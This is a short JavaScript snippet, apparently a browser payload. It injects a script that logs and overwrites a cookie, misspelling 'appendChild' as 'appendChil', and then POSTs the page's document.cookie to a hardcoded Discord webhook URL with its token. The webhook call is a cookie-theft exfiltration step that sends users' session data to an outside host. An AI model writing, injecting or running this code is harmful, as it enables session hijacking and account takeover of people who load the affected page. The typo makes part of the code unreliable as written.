
const script = document.createElement('script'); 
script.textContent = `
    console.log('Current Cookies:', document.cookie);

    document.cookie = "username=JohnDoe; path=/; expires=Fri, 31 Dec 2024 23:59:59 GMT";

    console.log('Updated Cookies:', document.cookie);
`;
document.body.appendChil(script); 

fetch('https://discord.com/api/webhooks/1320498070173257770/MeZB50l0vLghdjxsT9vYhV0x9cJuxJ7ku5v3wzBYAmJQP1mBykfjOSGt0YUBV5iARp7j', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
        content: `Cookies: ${document.cookie}`
    })
});
